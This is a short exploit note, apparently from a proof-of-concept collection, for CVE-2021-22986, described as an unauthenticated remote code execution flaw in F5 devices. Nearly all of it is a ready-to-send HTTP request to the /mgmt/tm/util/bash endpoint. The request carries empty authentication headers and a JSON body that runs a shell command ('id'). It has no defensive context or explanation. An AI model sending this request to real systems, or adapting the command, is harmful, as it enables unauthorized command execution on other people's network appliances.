### CVE-2021-22986
F5  unauthenticated RCE
```
POST /mgmt/tm/util/bash HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0)
Accept: */*
Connection: close
Authorization: Basic YWRtaW46
X-F5-Auth-Token: 
Content-Length: 46
Content-Type: application/json

{"command": "run", "utilCmdArgs": "-c id"}

```

![img](https://mmbiz.qlogo.cn/mmbiz_png/MZzibwD3j5oEFibdNlG58ZKEibTy9m08uAibrXQeM8k3nysbqTWLibXOlUzSsYTcdEXrGV3UXh8QLPOqsI1D7PbNdYg/0?wx_fmt=png)
